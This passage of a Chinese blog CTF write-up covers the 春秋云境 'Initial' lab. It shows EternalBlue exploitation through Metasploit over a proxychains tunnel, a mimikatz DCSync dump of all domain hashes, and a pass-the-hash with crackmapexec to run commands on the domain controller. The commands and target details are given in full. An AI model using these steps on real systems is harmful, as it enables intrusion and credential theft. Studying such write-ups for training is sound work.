+<tr>
+<td>✅ <strong>目标为支持架构</strong></td>
+<td>主要影响：Windows 7 &#x2F; Windows Server 2008 R2（x64 最稳定），部分 WinXP&#x2F;2003 也可利用（需不同 payload）。</td>
+</tr>
+</tbody></table>
+<p>接下来我们要利用永恒之蓝进行攻击</p>
+<p>这里需要用到渗透框架 <code>Metasploit Framework</code>，kali自带这个框架</p>
+<blockquote>
+<p>接着我们先了解一下MSF</p>
+<p> MSF 是 <strong>Metasploit Framework</strong> 的缩写，它是一个开源的渗透测试平台，广泛用于开发、测试和执行漏洞利用（exploit）代码，以评估目标系统的安全性。</p>
+<p><strong>漏洞利用：执行远程&#x2F;本地 exploit（如 <strong><code>**exploit/windows/smb/ms17_010_eternalblue**</code></strong>）</strong></p>
+</blockquote>
+<p>由于我们要用到kali，所以这里还是先用Neo-reGeorg对kali实现内网穿透</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761154986701-2240d279-b833-4358-b173-f0bfe99c6a58.png" referrerpolicy="no-referrer"></p>
+<p>然后我们需要 设置 <code>socks5</code> 代理  ，这里需要用到<code>proxychains4</code> 工具  </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761155059864-469db935-eff3-454d-935e-c0653ad5b8a4.png" referrerpolicy="no-referrer"></p>
+<p>启动msf</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>**proxychains4**</code> 是一个工具，用于强制让后续程序的网络流量通过预配置的代理链（如 SOCKS 或 HTTP 代理）。</li>
+<li><code>**msfconsole**</code> 是 Metasploit 的交互式命令行界面。</li>
+</ul>
+<p> 搜索 <code>ms17-010</code> 相关模块 ，一共有四个相关模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">search MS17-<span class="number">0</span>10</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761155344553-fd345677-2d3f-4b51-8882-c5e347bf0760.png" referrerpolicy="no-referrer"></p>
+<p>这里我们选择使用第一个模块，因为它支持的 Windows 版本较多  ，然后接下来依次输入以下命令来发起永恒之蓝攻击：  </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># 选择使用的模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># 设置payload，可以通过show payloads查看</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>  <span class="comment"># 设置靶机的ip</span></span><br><span class="line">exploit  <span class="comment"># 执行攻击</span></span><br></pre></td></tr></table></figure>
+
+<p> 运行成功会出现meterpreter&gt;  </p>
+<blockquote>
+<p><code>meterpreter&gt;</code> 是 <strong>Metasploit Framework（MSF）</strong> 中 <strong>Meterpreter 载荷（payload）成功执行后</strong>进入的<strong>交互式命令行提示符（扩展模块）</strong>。它表示你已经获得了一个与目标系统建立的高级、内存驻留型后渗透会话（session）， 对目标系统进行更深入的渗透  。</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761155591850-4bbb5027-65e1-419e-93fd-cdac7c6cef90.png" referrerpolicy="no-referrer"></p>
+<p>连接成功后，我们查看一下我们的权限</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<p>已经是system权限了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761156875879-0719eb0a-1e47-4611-aaae-636e97d3069f.png" referrerpolicy="no-referrer"></p>
+<h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><p>这里我们就已经打入目标主机了，但是该子机上并没有flag， 我们最后的flag在 <code>windows DC</code> 域控制器上面  </p>
+<table>
+<thead>
+<tr>
+<th><strong>172.22.1.2</strong></th>
+<th><code>DC01</code></th>
+<th>Windows Server 2016</th>
+<th>88, 135, 139, 445</th>
+<th><strong>DC域控（Domain Controller）</strong></th>
+</tr>
+</thead>
+</table>
+<blockquote>
+<p><strong>DC域控是什么？</strong></p>
+<p>DC（Domain Controller，域控制器） 是 Windows Active Directory（AD，活动目录） 网络架构中的核心服务器角色，负责集中管理网络中的用户、计算机、组策略、身份验证和授权等安全服务。**  **</p>
+<p>**在 CTF 或红队演练中：  拿到 DC &#x3D; 拿到 flag：域内所有用户凭证、敏感数据、GPO 后门均可获取。  **</p>
+</blockquote>
+<p>**如何拿到DCC呢？这里需要 进行 <strong><code>**DCSync**</code></strong> 攻击  **</p>
+<blockquote>
+<p>在 Active Directory 中，多个域控制器之间需要<strong>保持数据一致</strong>（比如用户密码修改后，所有 DC 都要同步更新）。为此，Windows 提供了一套名为 <strong>Directory Replication Service (DRS)</strong> 的协议，允许 DC 之间通过 <strong>RPC 调用（如 <strong><code>**DsGetNCChanges**</code></strong>）</strong> 请求同步目录数据， 每隔15min就会进行一次域数据同步  。</p>
+</blockquote>
+<blockquote>
+<p>DCSync 攻击就是伪装成一台合法的域控制器，向目标 DC 发起 DRS 复制请求，要求“同步”特定用户的凭证信息。由于 AD 信任具备复制权限的主体，目标 DC 会主动返回该用户的密码哈希和 Kerberos 密钥。  </p>
+</blockquote>
+<p>**我们可以通过 <strong><code>**DCSync**</code></strong> 来导出所有用户的 <strong><code>**hash**</code></strong> 然后进行哈希传递攻击  **</p>
+<p>如果想要执行 DCSync， 必须拥有以下<strong>任一高权限身份：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Domain Admins（域管理员）</span><br><span class="line">Enterprise Admins（企业管理员）</span><br><span class="line">Administrators 组成员（在域控制器本地）</span><br><span class="line">被显式授予 “Replicating Directory Changes” 权限的账户（可通过 ACL 滥用实现）</span><br></pre></td></tr></table></figure>
+
+<p>在我们一开始的fscan中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[+] MS17-<span class="number">0</span>10 <span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>	(Windows Server <span class="number">2008</span> R2 Enterprise <span class="number">7601</span> Service Pack <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>说明我们拿下的这台机子是<code>enterprise</code> 用户  ，可以进行DCSync攻击，接下来我们 来获取用户的 <code>hash</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load kiwi  <span class="comment"># 加载 kiwi 扩展模块，支持内存凭证提取、哈希转储、票据操作、DCSync 等高级功能。</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> exit  <span class="comment"># 通过 Kiwi 调用 Mimikatz 的 lsadump::dcsync 功能，导出 xiaorang.lab 域内所有用户的凭证信息(包括哈希值)，并以 CSV 格式输出。</span></span><br></pre></td></tr></table></figure>
+
+<p> 结果如下：  </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761156961665-adf368fd-ba4c-4a5f-be35-050264d677e6.png" referrerpolicy="no-referrer"></p>
+<p>我们可以看到<code>Administrator</code> 用户的 <code>hash</code>，   </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">500</span>     Administrator   10cf89a850fb1cdbe6bb432b859164c8        <span class="number">512</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们使用 <code>crackmapexec</code> 来进行哈希传递攻击，来实现 <code>DC域控</code> 上的任意命令执行</p>
+<blockquote>
+<p><strong>CrackMapExec（简称 CME）</strong> 是一个专为 <strong>Active Directory（AD）渗透测试和红队行动</strong> 设计的<strong>后渗透利用框架</strong>，主要用于<strong>大规模自动化地枚举、攻击和利用 Windows 网络中的 SMB、LDAP、MSSQL、WinRM 等服务</strong>。  </p>
+<p>这道题我们 <strong>使用哈希进行横向移动（PtH），直接利用哈希值完成身份认证，从而在其他主机上执行命令或获取访问权限。【 Windows 的 NTLM 认证协议 在验证用户身份时，并不强制要求明文密码，而是使用 NTLM Hash（即密码的 MD4 哈希） 进行挑战-响应计算。】</strong></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxychains4 crackmapexec smb <span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span> -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157032145-493d1e51-06db-412f-ac60-f77cd745ceab.png" referrerpolicy="no-referrer"></p>
+<p>拿到flag3：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="最终flag"><a href="#最终flag" class="headerlink" title="最终flag"></a>最终flag</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-<span class="number">4813</span>-87d4-e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png" referrerpolicy="no-referrer"></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=3636469976&amp;s=640" referrerpolicy="no-referrer" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=3636469976&amp;s=640" referrerpolicy="no-referrer" title="头像" alt="头像"></a><div class="post-copyright__author_name">Jatopos</div><div class="post-copyright__author_desc">Welcome to JATOPOS's home</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/')">春秋云境 - Initial</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=春秋云境 - Initial&amp;url=http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/&amp;pic=https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Jatopos的博客</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Web-Writeups/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Web Writeups<span class="tagsPageCount">6</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/10/23/NewStar%20CTF%202025%20web%20week3/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023025415467.png" referrerpolicy="no-referrer" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NewStar CTF 2025 web week3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/10/23/HNUCTF%E2%80%94%E2%80%94Jatopos/" title="HNUCTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023030810720.jpg" referrerpolicy="no-referrer" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-10-23</div><div class="title">HNUCTF</div></div></a></div><div><a href="/2025/10/23/MoeCTF%202025/" title="MoeCTF 2025"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023025925631.png" referrerpolicy="no-referrer" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-10-23</div><div class="title">MoeCTF 2025</div></div></a></div><div><a href="/2025/10/05/N1CTF%20Junior%202025%202_2/" title="N1CTF Junior 2025 2&#x2F;2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005223718653.jpg" referrerpolicy="no-referrer" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-10-05</div><div class="title">N1CTF Junior 2025 2&#x2F;2</div></div></a></div><div><a href="/2025/10/16/NewStar%20CTF%202025%20web%20week1&week2/" title="NewStar CTF 2025 web week1&amp;week2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251016211424237.jpg" referrerpolicy="no-referrer" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-10-16</div><div class="title">NewStar CTF 2025 web week1&amp;week2</div></div></a></div><div><a href="/2025/10/23/NewStar%20CTF%202025%20web%20week3/" title="NewStar CTF 2025 web week3"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023025415467.png" referrerpolicy="no-referrer" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-10-23</div><div class="title">NewStar CTF 2025 web week3</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=3636469976&amp;s=640" referrerpolicy="no-referrer" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Genshin/15.jpg" referrerpolicy="no-referrer" alt="status"/></div></div><div class="author-info__description">一往无前虎山行，拨开云雾见光明。这个世界不会绝情到让你无路可走，总有一个你坚持的理由。</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Jatopos</h1><div class="author-info__desc">Welcome to JATOPOS's home</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/jatopos" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/280723251" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP-RCE-%E4%B8%8E-WebShell-%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.</span> <span class="toc-text">ThinkPHP RCE 与 WebShell 获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%9ASUID-%E4%B8%8E-sudo-%E6%BB%A5%E7%94%A8%E8%AF%BB%E5%8F%96-flag1"><span class="toc-number">1.2.</span> <span class="toc-text">权限提升：SUID 与 sudo 滥用读取 flag1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E2%80%94%E2%80%94%E6%9F%A5%E7%BD%91%E6%AE%B5"><span class="toc-number">2.1.</span> <span class="toc-text">内网横向移动——查网段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%EF%BC%9A%E4%BD%BF%E7%94%A8-fscan-%E6%89%AB%E6%8F%8F%E5%AD%98%E6%B4%BB%E6%9C%BA%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">内网扫描：使用 fscan 扫描存活机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">2.3.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-number">2.3.1.</span> <span class="toc-text">frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Neo-reGeorg-Proxifier"><span class="toc-number">2.3.2.</span> <span class="toc-text">Neo-reGeorg+Proxifier</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA-qcloudCosAction-php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">信呼OA qcloudCosAction.php 任意文件上传漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17-010%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89%E6%94%BB%E9%99%B7-Win7-%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.1.</span> <span class="toc-text">MS17-010（永恒之蓝）攻陷 Win7 主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">DCSync攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E7%BB%88flag"><span class="toc-number">4.</span> <span class="toc-text">最终flag</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/" title="春秋云境 - Initial"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png" referrerpolicy="no-referrer" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云境 - Initial"/></a><div class="content"><a class="title" href="/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/" title="春秋云境 - Initial">春秋云境 - Initial</a><time datetime="2025-11-03T15:21:32.000Z" title="发表于 2025-11-03 23:21:32">2025-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/23/NewStar%20CTF%202025%20web%20week3/" title="NewStar CTF 2025 web week3"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023025415467.png" referrerpolicy="no-referrer" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStar CTF 2025 web week3"/></a><div class="content"><a class="title" href="/2025/10/23/NewStar%20CTF%202025%20web%20week3/" title="NewStar CTF 2025 web week3">NewStar CTF 2025 web week3</a><time datetime="2025-10-22T18:49:00.000Z" title="发表于 2025-10-23 02:49:00">2025-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/23/MoeCTF%202025/" title="MoeCTF 2025"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023025925631.png" referrerpolicy="no-referrer" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2025"/></a><div class="content"><a class="title" href="/2025/10/23/MoeCTF%202025/" title="MoeCTF 2025">MoeCTF 2025</a><time datetime="2025-10-22T18:40:00.000Z" title="发表于 2025-10-23 02:40:00">2025-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/23/HNUCTF%E2%80%94%E2%80%94Jatopos/" title="HNUCTF"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251023030810720.jpg" referrerpolicy="no-referrer" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HNUCTF"/></a><div class="content"><a class="title" href="/2025/10/23/HNUCTF%E2%80%94%E2%80%94Jatopos/" title="HNUCTF">HNUCTF</a><time datetime="2025-10-22T18:30:00.000Z" title="发表于 2025-10-23 02:30:00">2025-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/16/NewStar%20CTF%202025%20web%20week1&amp;week2/" title="NewStar CTF 2025 web week1&amp;week2"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251016211424237.jpg" referrerpolicy="no-referrer" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStar CTF 2025 web week1&amp;week2"/></a><div class="content"><a class="title" href="/2025/10/16/NewStar%20CTF%202025%20web%20week1&amp;week2/" title="NewStar CTF 2025 web week1&amp;week2">NewStar CTF 2025 web week1&amp;week2</a><time datetime="2025-10-16T12:54:00.000Z" title="发表于 2025-10-16 20:54:00">2025-10-16</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div 